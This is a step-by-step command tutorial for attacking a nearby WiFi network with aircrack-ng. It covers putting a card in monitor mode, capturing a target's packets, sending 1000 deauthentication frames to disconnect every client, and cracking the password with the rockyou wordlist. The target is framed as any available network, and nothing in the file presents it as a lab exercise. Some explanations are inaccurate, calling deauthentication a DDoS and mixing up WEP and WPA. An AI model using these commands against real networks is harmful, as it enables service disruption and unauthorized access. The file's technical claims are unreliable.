~Install the tool~
$ sudo apt-get install aircrack-ng

~Setting the WiFi card into Monitor mode~
$ sudo ifconfig wlan0 down  #check the name of your wifi card by typing 'ifconfig'
$ sudo iwconfig wlan0 mode monitor
$ sudo ifconfig wlan0 up

$ sudo airmon-ng check kill   #kill the network manager before proceeding.
$ sudo airmon-ng start wlan0 
$ sudo airodump-ng wlan0    #starts checking the networks nearby by collecting their packets. DoS will be performed on one of the below networks.

~~Additional Step 1: This step is necessary for brute-forcing the password of the network~~
$ sudo airodump-ng --bssid 3C:95:09:82:77:F1 --channel 11 --write ~/path/to/your/file/RandomAvailableWifiNetwork wlan0
  #breaking down the command
  #Bssid is the MAC address of the Router of RandomAvailableWifiNetwork. Note the bssid of the target network interface.
  #Channel is where all the access points of the network can be deployed on. Note the channel running the target network interface.
  #w tag is used to store all the packet captures with the desired file name RandomAvailableWifiNetwork.
  #wlan0 being the wifi card interface.
  
~Performing the DDoS~
$ sudo aireplay-ng --deauth 1000 -a 3C:95:09:82:77:F1 wlan0
  #breaking down the command
  #Deauth tag sends a specified number of deauth packets(here 1000) which tells the client "Please disconnect from me, reconnect and reauthenticate."
  #a tag is for the specifying the bssid of the target network interface.
  #On running this command, the network gets overwhelmed by the huge number of distributed packets it is receiving. 
  #Thus all the connected devices are disconnected from the network.

~~Additional Step 2: In this step, cracking the password by brute-forcing is done~~
$ sudo aircrack-ng -b 3C:95:09:82:77:F1 -w /usr/share/wordlists/rockyou.txt ~/path/to/your/file/RandomAvailableWifiNetwork.cap
  #Note: It takes a vast amount of time to brute force because of the varying security methods, strength of password and lack of a proper pass-wordlist.
  #If the password is weak, Aircrack-ng will recover the WEP key from the RandomAvailableWifiNetwork.cap capture file.

~Necessary steps to connect back to the WiFi~
$ sudo ifconfig wlan0 down
$ sudo iwconfig wlan0 mode managed
$ sudo ifconfig wlan0 up
$ service network-manager restart
#or
$ systemctl restart NetworkManager
